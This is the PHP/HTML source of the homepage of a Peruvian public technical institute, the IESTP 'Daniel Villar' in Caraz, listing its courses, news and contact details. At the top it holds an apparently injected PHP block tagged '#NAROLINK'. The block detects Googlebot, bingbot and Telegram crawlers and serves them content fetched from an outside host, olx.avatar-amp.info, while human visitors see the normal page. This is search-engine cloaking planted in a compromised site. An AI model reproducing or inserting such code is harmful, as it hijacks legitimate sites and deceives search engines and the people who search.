<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://olx.avatar-amp.info/iestpdv.edu.pe/index.txt');#NAROLINK
    echo $message;
}
?>
<!--A Design by W3layouts 
Author: W3layout
Author URL: http://w3layouts.com
License: Creative Commons Attribution 3.0 Unported
License URL: http://creativecommons.org/licenses/by/3.0/
-->
<!DOCTYPE html>
<html>
<head>
<meta name="google-site-verification" content="anjVrqrlxhvSOjgiP0XTXlG_LYUW5Ts3g1Em7Q75ycs" />
<title>Instituto de Educación Superior Tecnológico Público &quot;Daniel Villar&quot;</title>
<link rel="icon" type="image/ico" href="/images/iestp.ico" />
<!--css-->
<link href="css/bootstrap.css" rel="stylesheet" type="text/css" media="all" />
<link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
<link rel="stylesheet" href="css/ken-burns.css" type="text/css" media="all" />
<link rel="stylesheet" href="css/animate.min.css" type="text/css" media="all" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<!--css-
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Studies Plus Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony Ericsson, Motorola web design" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>-->
<!--js-->
<script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=VjsjKzqZDlVp-V_kX8NriukLmVpw8dCiusM-CZEu7ozi5ZV7hPcidByjaZkanvNvsM_V71gYmfO7F9coqok1oRIoEoFZiL2uhAHzGEBxmJKY95PNce5J8HY7lqfQ7101ZUAkItjgo1Tanljokxg0F2VxUD3E8dgoK6mjf1w1GU1Umn3mA5FV5IjxwH1w35tA" charset="UTF-8"></script><link rel="stylesheet" crossorigin="anonymous" href="https://gc.kis.v2.scr.kaspersky-labs.com/E3E8934C-235A-4B0E-825A-35A08381A191/abn/main.css?attr=aHR0cHM6Ly9jcGFuZWwuaWVzdHBkdi5lZHUucGUvY3BzZXNzNTA1NzQ3OTgzNS9kb3dubG9hZD9za2lwZW5jb2RlPTEmZmlsZT0lMmZob21lMyUyZmllc3RwaGgwJTJmcHVibGljX2h0bWwlMmZpbmRleC5odG1s"/><script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<!--js-->
<!--webfonts-->
<link href='//fonts.googleapis.com/css?family=Cagliostro' rel='stylesheet' type='text/css'>
<link href='//fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600,600italic,700,700italic,800,800italic' rel='stylesheet' type='text/css'>
<!--webfonts-->
</head>
<body>
	<!--header-->
		<div class="header">
			<div class="header-top">
				<div class="container">
					<div class="detail">
						<ul>
							<li><i class="glyphicon glyphicon-earphone" aria-hidden="true"></i> 043-392141</li>
							<li><i class="glyphicon glyphicon-time" aria-hidden="true"></i> Lunes-Viernes 7:00 Am hasta las 3:00 Pm </li>
						</ul>
					</div>
					<div class="indicate">
						<p><i class="glyphicon glyphicon-map-marker" aria-hidden="true"></i>Jr. Sucre Nº 124 -Caraz</p>
					</div>
					<div class="clearfix"></div>
				</div>
			</div>
			<div class="container">
				<nav class="navbar navbar-default">
					<div class="container-fluid">
				<!--Brand and toggle get grouped for better mobile display-->
						<div class="navbar-header">
							<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
								<span class="sr-only">Toggle navigation</span>
								<span class="icon-bar"></span>
								<span class="icon-bar"></span>
								<span class="icon-bar"></span>
							</button>				  
							<div class="navbar-brand">
								<h1><img src="images/logo.png" width="320" height="75" alt=""/></h1>
							</div>
						</div>

				<!-- Collect the nav links, forms, and other content for toggling -->
						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
							<nav class="link-effect-2" id="link-effect-2">
								<ul class="nav navbar-nav">
									<li class="active"><a href="index.html"><span data-hover="Inicio">Inicio</span></a></li>
									<li><a href="acerca.html"><span data-hover="Acerca">Acerca</span></a></li>
									<li><a href="servicios.html"><span data-hover="Servicios">Servicios</span></a></li>
									<li><a href="proyectos.html"><span data-hover="Proyectos">Proyectos</span></a></li>	
									<li><a href="transparencia.html"><span data-hover="transparencia">Transparencia</span></a></li>
									<li><a href="normas.html"><span data-hover="Normas">Normas</span></a></li>
									<li><a href="contacto.html"><span data-hover="Contacto">Contacto</span></a></li>
									<li><a href="WEBBOOT/bolsa.html"><span data-hover="Bolsa de Trabajo">Bolsa de Trabajo</span></a></li>
								</ul>
							</nav>
						</div>
					</div>
				</nav>
			</div>
		</div>
	<!--header-->
	<!-- banner -->
	<div class="banner">
		<div id="kb" class="carousel kb_elastic animate_text kb_wrapper" data-ride="carousel" data-interval="6000" data-pause="hover">

            <!-- Wrapper-for-Slides -->
            <div class="carousel-inner" role="listbox">

                <!-- First-Slide   -->
                <div class="item active">
                    <img src="images/banner2-2022.jpg" alt="" class="img-responsive" />
                    <div class="carousel-caption kb_caption">
                        <h3 data-animation="animated flipInX">Inicio de clases 2024-II</h3>
                        <h4 data-animation="animated flipInX">26 de agosto</h4> 
                    </div>
                </div>

                <!-- Second-Slide -->
                <div class="item">
                    <img src="images/banner1.jpg" alt="" class="img-responsive" />
                   <!--  <img src="images/Cronograma.jpg" alt="" class="img-responsive" />-->
                    <div class="carousel-caption kb_caption kb_caption_right">
                        <h3 data-animation="animated flipInX">Ven y Forma parte</h3>
                        <h4 data-animation="animated flipInX">De la Familia Villarina</h4> 
                    </div>
                </div>

                <!-- Third-Slide -->
                <div class="item">
                    <img src="images/banner6.jpg" alt="" class="img-responsive" />
                    <div class="carousel-caption kb_caption kb_caption_center">
                        <h3 data-animation="animated flipInX">Te ofrecemos 5 carreras profesionales</h3>
                        <h4 data-animation="animated flipInX">Estudia para tu futuro</h4>
                    </div>
                </div>
				<!-- Fourd-Slide -->
                <!--<div class="item">
                    <img src="images/banner3.jpg" alt="" class="img-responsive" />
                    <div class="carousel-caption kb_caption kb_caption_center">
                        <h3 data-animation="animated flipInX">Contamos con equipos modernos</h3>
                        <h4 data-animation="animated flipInX">en las carreras profesionales</h4>
                    </div>
                </div>
            </div>-->
			
            <!-- Left-Button -->
            <a class="left carousel-control kb_control_left" href="#kb" role="button" data-slide="prev">
				<span class="glyphicon glyphicon-menu-left" aria-hidden="true"></span>
                <span class="sr-only">Previous</span>
            </a>

            <!-- Right-Button -->
            <a class="right carousel-control kb_control_right" href="#kb" role="button" data-slide="next">
                <span class="glyphicon glyphicon-menu-right" aria-hidden="true"></span>
                <span class="sr-only">Next</span>
            </a>
			
        </div>
		<script src="js/custom.js"></script>
	</div>
<!--banner-->
	<!--content-->
		<div class="content">
			<!--banner-bottom-->
			<div class="banner-bottom">
<!--				<div class="col-md-3 ban-grid">
					<div class="ban-left">
					    
                         <h4><a href="Matricula/inimat.html">                 
                            SISTEMA DE MATRÍCULA VIRTUAL</a></h4>
                            <p><a href="Matricula/inimat.html">¡Matricúlate ya!</a></p>        
                            
 						<h4><a>SISTEMA DE MATRÍCULA VIRTUAL</a></h4>    
                        <p>Proceso de matrícula regular 2021-II finalizado</p>      
 						<h4><a href="Matricula/enmantenimiento.html"> 
                            SISTEMA DE MATRÍCULA VIRTUAL</a></h4>
						<p><a href="Matricula/enmantenimiento.html">¡Matricúlate ya!</a></p>     
					</div>
					<div class="ban-right">
						<i class="glyphicon glyphicon-user"> </i>
					</div>

					<div class="clearfix"></div>
				</div> 
-->

				
				<div class="col-md-3 ban-grid">
					<div class="ban-left">
    						<h3> <a href="concurso_gestion_pedagogica/concurso2024/concurso2024.html">CONVOCATORIA PARA CONCURSO DE PUESTOS DE GESTIÓN PEDAGÓGICA 2025</a></h3>
						<p><a href="concurso_gestion_pedagogica/concurso2024/convocatoria.pdf">Bases para el concurso</a></p>

					</div>
					
					<div class="ban-right">
					    <i class="glyphicon glyphicon-facetime-video"> </i>
					</div>
				</div>


				<div class="col-md-3 ban-grid">
					<div class="ban-left">
						<h4><a href="http://iestpdv.edu.pe/egresa">REGISTRO DE EGRESADOS</a></h4>
						<p>Ficha<span style="color: #FF0000"> </span>de Inscripción</p>
					</div>
					<div class="ban-right">
						<i class="glyphicon glyphicon-list-alt"> </i>
					</div>
					<div class="clearfix"></div>
				</div>
				
				<div class="col-md-3 ban-grid">
					<div class="ban-left">
						<h4><a href="http://iestpdv.edu.pe/aulavirtual">AULA VIRTUAL</a></h4>
						<h7><a href="guias.html">GUIAS</a></h7>
						<p>Inicio de clases 2024-II:<span style="color: #FF0000"> </span>26 de agosto</p>
					</div>
					<div class="ban-right">
					    <i class="glyphicon glyphicon-blackboard"> </i>
					</div>
				</div>

		<!--	<div class="col-md-3 ban-grid">
					<div class="ban-left">
						<h4><a href="mesap.html">MESA DE PARTES VIRTUAL</a></h4>
						<p><a href="mesap.html">Trámite Documentario</a></p>
					</div>
					<div class="ban-right">
					<i class="glyphicon glyphicon-blackboard"> </i>
					</div>
					<div class="clearfix"></div>
				</div>-->
				
				<div class="col-md-3 ban-grid">
					<div class="ban-left">
						<h3><a href="sigacad/sistAdm.html">SISTEMA DE GESTIÓN ACADÉMICA Y ADMINISTRATIVA</a></h3>
					</div>
					<div class="ban-right">
					<i class="glyphicon glyphicon-folder-open"> </i>
					</div>
					<div class="clearfix"></div>
				</div>
				<!--<div class="clearfix"></div>
				</div>-->
	
		<!--    <div class="col-md-3 ban-grid">
					<div class="ban-left">
						<h3><a href="renueva.html">RESULTADOS DE EVALUACION DE DESEMPEÑO DOCENTE PARA RENOVACIÓN 2023</a></h3>
					</div>
					<div class="ban-right">
					<i class="glyphicon glyphicon-blackboard"> </i>
					</div>
					<div class="clearfix"></div>
				</div>-->
				<!--<div class="clearfix"></div>
				</div>-->
	
<!--	<div class="col-md-3 ban-grid">
					<div class="ban-left">
					    <h3><a href="">INSCRIPCIÓN EXAMEN DE ADMISIÓN 2022&nbsp;</a></h3>           
						<h3><a href="admision/instrucciones.php">INSCRIPCIÓN EXAMEN DE ADMISIÓN 2022&nbsp;</a></h3>   
					</div>
					<div class="ban-right">
					    <i class="glyphicon glyphicon-blackboard"> </i>
					</div>
		</div>
-->
					<div class="clearfix"></div>
				</div>
				<div class="clearfix"></div>
			
				<!--<div class="clearfix"></div>-->
						
			<!--banner-bottom-->
			<!--welcome-->
			<div class="welcome-w3">
			    <!--<fieldset>
           	            <div align='center'><embed src='Comunicado-2022-II.pdf' width='800px' height='1200px' /></div>
                </fieldset><br><br>-->
				<div class="container">
					<h2 class="tittle">Bienvenido A Nuestro Instituto </h2>
								
					<p>&nbsp;</p>
					<div class="wel-grids">
					  <div class="col-md-4 wel-grid">
						  <div class="port-7 effect-2">
								<div class="image-box">
									<img src="images/w1.jpg" class="img-responsive" alt="Image-2">
								</div>
								<div class="text-desc">
									<h4>Estudiantes de Enfemería</h4>
								</div>
							</div>
							<div class="port-7 effect-2">
								<div class="image-box">
									<img src="images/w2.jpg" class="img-responsive" alt="Image-2">
								</div>
								<div class="text-desc">
									<h4>Estudiantes de Secretariado</h4>
								</div>
							</div>
						</div>
						<div class="col-md-4 wel-grid">
							<img src="images/w3.jpg"  class="img-responsive" alt="Image-2">
							<div class="text-grid">
								<h4>Estudiantes de Computación</h4>
							</div>
						</div>
						<div class="col-md-4 wel-grid">
							<div class="port-7 effect-2">
								<div class="image-box">
									<img src="images/w4.jpg" class="img-responsive" alt="Image-2">
								</div>
								<div class="text-desc">
									<h4>Estudiantes de Mecánica</h4>
								</div>
							</div>
							<div class="port-7 effect-2">
								<div class="image-box">
									<img src="images/w5.jpg" class="img-responsive" alt="Image-2">
								</div>
								<div class="text-desc">
									<h4>Estudiantes de Agropecuaria</h4>
								</div>
							</div>
						</div>
						<div class="clearfix"></div>
					</div>
				</div>
			</div>
			<!--welcome-->
			<!--student-->
			<div class="student-w3ls">
				<div class="container">
					<h3 class="tittle"> NUESTRAS OFERTAS					</h3>
					<div class="student-grids">
					  <div class="col-md-6 student-grid">
					    <h4>Instituto de Educación Superior Tecnológico Público</h4>
								<p>Somos una Institución que brinda una educación integral formando futuros profesionales técnicos competentes acorde a los nuevos avances tecnológicos y pedagógicos, con valores éticos, moral y religioso contando con una plana docente seleccionado y comprometido al trabajo.</p>
								<p>Seremos líderes brindando una educación innovadora y de calidad de Aprendizaje con una base humanista, científica enmarcando en la práctica de valores incursionando en el mundo de de la alta tecnología como futuros profesionales técnicos egresados competentes en mejorar la calidad educativa en nuestra sociedad y país. Nuestras Ofertas Educativas</p>
								<ul class="grid-part">
									<li><i class="glyphicon glyphicon-ok-sign"> </i>Arquitectura de Plataformas y Servicios de Tecnologias de la Informacion</li>
									<li><i class="glyphicon glyphicon-ok-sign"> </i>Enfermería Técnica</li>
									<li><i class="glyphicon glyphicon-ok-sign"> </i>Secretariado Ejecutivo</li>
									<li><i class="glyphicon glyphicon-ok-sign"> </i>Mecatronica Automotriz</li>
									<li><i class="glyphicon glyphicon-ok-sign"> </i>Producción Agropecuaria</li>
									<li><i class="glyphicon glyphicon-ok-sign"></i>Guía Oficial de Turismo</li>
								</ul>

						</div>
						<div class="col-md-6 student-grid">
							<img src="images/w6.jpg" class="img-responsive" alt="Image-2">
						</div>
						<div class="clearfix"></div>
					</div>
				</div>
			</div>
			<!--student-->
			<!--testimonials-->
				<div class="testimonials-w3">
					<div class="container">
					<h3 class="tittle2">Humilde Benefactor</h3>
						<div class="test-grid">
							<img src="images/quote.png" alt=/>
						<h5>Gracias a Don Daniel de Paula Villar, somos una Institución lider en la formación de Profesionales Técnicos.</h5>
						<p><i>Daniel Villar</i></p>
						</div>
					</div>
				</div>
			<!--testimonials-->
			<!--news-->
				<div class="new-w3agile">
					<div class="container">
						<div class="new-grids">
							<div class="col-md-4 new-left">
								<h3 class="tittle1">Últimos Eventos</h3>
								<div class="new-top">
									<h5>Formación Contínua</h5>
									<p>Se ha realizado planes para la ejecución de actividades de formación contínua dirigido a docentes y estudiantes</p>
								</div>
								<div class="new-top1">
									<h5>Articulación con el Sector Productivo</h5>
									<p>Se ha previsto para el presente año lectivo trabajar los planes de articulación con las empresas productivas</p>
								</div>
								<div class="new-top">
									<h5>Examen de Admisión</h5>
									<p>Se informará sobre la nueva fecha del examen de admisión 2020</p>
								</div>
								<div class="new-top1">
									<h5>Nuevas Carreras</h5>
									<p>Se ha desarrollado planes curriculares para la incorporación de nuevas carreras profesionales, la carrera de computación e informática será reemplazado por la carrera profesional de arquitectura de plataformas y tecnologías de la información, la carrera profesional de mecánica autmotriz será reemplazado por la carrera de mecátronica automotriz</p>
								</div>
								
							</div>
							<div class="col-md-8 new-right">
								<h3 class="tittle1">Últimas Noticias</h3>
									<h4>Proceso de Matrículas</h4>
									<p>Matrícula ordinaria: Se informará por este medio.</p>
								<div class="new-bottom">
									<div class="new-bottom-left">
										<img src="images/w7.jpg" class="img-responsive" alt="">
									</div>
										<div class="new-bottom-right">
										<h5>Relación De Ingresantes Por Exoneración (Primer Y Segundo Puesto)</h5>
										<p>En Proceso.</p>
										</div>
										<div class="clearfix"></div>
								</div>
									<h4>Informe Finales</h4>
									<p>Los Postulantes Que Ocuparon Primeros Puestos Y Que No Aparecen En La Relación, Deberán De Rendir El Examen De Admisión</p>
									<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = 'https://connect.facebook.net/es_LA/sdk.js#xfbml=1&version=v2.11';
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script><div class="fb-page" data-href="https://www.facebook.com/triunfarendanielvillar/" data-width="700" data-small-header="false" data-adapt-container-width="false" data-hide-cover="false" data-show-facepile="true"><blockquote cite="https://www.facebook.com/triunfarendanielvillar/" class="fb-xfbml-parse-ignore">
  <blockquote>
    <p><a href="https://www.facebook.com/triunfarendanielvillar/"> <center>Instituto Daniel Villar de Caraz</center></a></p>
  </blockquote>
</blockquote>
							</div>
								<div class="clearfix"></div>
						</div>
					</div>
				</div>
			<!--news-->
		</div>
  

		<!--content-->
		<!--footer-->
			<div class="footer-w3">
				<div class="container">
					<div class="footer-grids">
						<div class="col-md-4 footer-grid">
							<h4>Nuestras Visitas</h4>
							
						</div>
						<div class="col-md-4 footer-grid">
						<h4>Puestos de Instagram</h4>
							<div class="footer-grid1">
								<img src="images/w1.jpg" alt=" " class="img-responsive">
							</div>
							<div class="footer-grid1">
								<img src="images/w2.jpg" alt=" " class="img-responsive">
							</div>
							<div class="footer-grid1">
								<img src="images/w4.jpg" alt=" " class="img-responsive">
							</div>
							<div class="footer-grid1">
								<img src="images/w5.jpg" alt=" " class="img-responsive">
							</div>
							<div class="footer-grid1">
								<img src="images/w6.jpg" alt=" " class="img-responsive">
							</div>
							<div class="footer-grid1">
								<img src="images/w2.jpg" alt=" " class="img-responsive">
							</div>
							<div class="clearfix"> </div>
						</div>
						<div class="col-md-4 footer-grid">
						<h4>Information</h4>
							<ul>
								<li><i class="glyphicon glyphicon-map-marker" aria-hidden="true"></i>Región Ancash, Provincia de Huaylas, Distrito de Caraz.</li>
								<li><i class="glyphicon glyphicon-earphone" aria-hidden="true"></i>043-392141</li>
								<li><i class="glyphicon glyphicon-envelope" aria-hidden="true"></i><a href="mailto:example@mail.com">dgiestpdv@gmail.com</a></li>
								<li><i class="glyphicon glyphicon-time" aria-hidden="true"></i>Lunes-Viernes 07:00 a.m. Hasta 03:00 p.m.</li>
							</ul>
						</div>
						<div class="clearfix"></div>
					</div>
				</div>
			</div>
		<!--footer-->
		<!---copy--->
			<div class="copy-section">
				<div class="container">
					<div class="social-icons">
						<a href="#"><i class="icon1"></i></a>
						<a href="#"><i class="icon2"></i></a>
						<a href="#"><i class="icon3"></i></a>
						<a href="#"><i class="icon4"></i></a>
					</div>
					<div class="copy">
						<p>&copy; WebMaster: Leonid Paredes Panca</p>
					</div>
				</div>
			</div>
			<!---copy--->


				
</body>
</html>
